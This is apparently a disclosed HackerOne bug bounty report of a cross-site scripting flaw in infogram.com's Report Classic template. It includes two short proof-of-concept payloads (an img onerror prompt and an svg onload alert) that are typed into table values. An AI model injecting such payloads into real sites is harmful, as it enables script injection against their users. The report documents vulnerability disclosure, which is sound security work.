# XSS on infogram.com

## Report Details
- **Report ID**: 283565
- **URL**: https://hackerone.com/reports/283565
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-10-27T15:57:21.110Z
- **Disclosed**: 2017-11-01T10:02:27.325Z

## Reporter
- **Username**: mondhers
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
Hello,

There is a XSS on Report templates.

Free templates : Report Classic 

When we modify the values of table we can put XSS Payload.

Payload used : 

"><img src=x onerror=prompt(0);>
"/><svg/onload=alert(0);>


## Attachments
- infogram_1.PNG
- infogram_xss.PNG
- infogram_xssed.PNG
